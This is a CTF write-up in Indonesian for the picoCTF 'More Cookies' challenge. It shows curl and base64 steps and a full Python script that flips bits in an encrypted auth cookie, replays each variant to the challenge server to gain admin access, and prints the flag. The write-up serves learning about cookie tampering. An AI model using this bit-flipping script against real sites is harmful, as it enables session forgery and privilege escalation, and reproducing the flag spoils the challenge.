# More Cookies
- Link: https://play.picoctf.org/practice/challenge/124?category=1&page=1

## Tantangan
I forgot Cookies can Be modified Client-side, so now I decided to encrypt them! http://mercury.picoctf.net:15614/

## Penyelesaian
- Sekarang kita coba akses cookie di web tersebut dengan tool `curl`
```sh
curl -I http://mercury.picoctf.net:15614/
```

- Sekarang kita coba decode value cookie `auth_name` dengan base64. Disini terlihat bahwa cookie tersebut masih terencode dengan base64
```sh
echo 'copy_cookie_disini' | base64 -d
```

- Setelah kita coba decode lagi, ternyata cookie tersebut dalam keadaan terenkripsi


- Menurut deskripsi tantangan ini, kita bisa mengubah cookie tersebut dalam bentuk yang masih terenkripsi. Namun, jika metode enkripsinya [Homomorfik](https://en.wikipedia.org/wiki/Homomorphic_encryption), perubahan yang dilakukan pada bentuk cookie terenkripsi tersebut akan mempengaruhi bentuk yang didekripsi. Ini dapat dieksploitasi menggunakan [Bit Flipping Attack](https://en.wikipedia.org/wiki/Bit-flipping_attack). Dengan harapan kita bisa mengubah plaintext pada admin dari `0` menjadi `1`
- Kita bisa lakukan Bit Flipping Attack dengan program python. Copy source code berikut ini lalu simpan dengan nama `more_cookies.py`
```sh
from pwn import *
import requests
import base64
import re

#Mengambil cookie
s = requests.Session()
r = s.get("http://mercury.picoctf.net:15614/")
cookie = s.cookies["auth_name"]
print('Cookie : ',cookie)

#Decode cookie dan convert ke byte array
raw_cookie = bytearray(base64.b64decode(base64.b64decode(cookie)))
n = len(raw_cookie)

success = False
for i in range(n):
	for j in range(8):
		mask = (1 << j)
		
		#Flip Bit
		raw_cookie[i] = raw_cookie[i] ^ mask
		
		#Inject Cookie
		new_cookie = base64.b64encode(base64.b64encode(raw_cookie)).decode("ascii")
		r = requests.get("http://mercury.picoctf.net:15614/", cookies = {"auth_name": new_cookie})
		
		#Mencari Flag dengan regex
		flag = re.search(r"picoCTF{[^}]+}", r.text)
		if flag is not None:
			print('Flag : ',flag.group(0))
			success = True
			break
		else:
			#Kembali Semula
			raw_cookie[i] = raw_cookie[i] ^ mask
			
	if success == True:
		break

```
- Setelah itu kita eksekusi program tersebut di terminal
```sh
python3 more_cookies.py
```

- Flag
```sh
picoCTF{cO0ki3s_yum_a9a19fa6}
```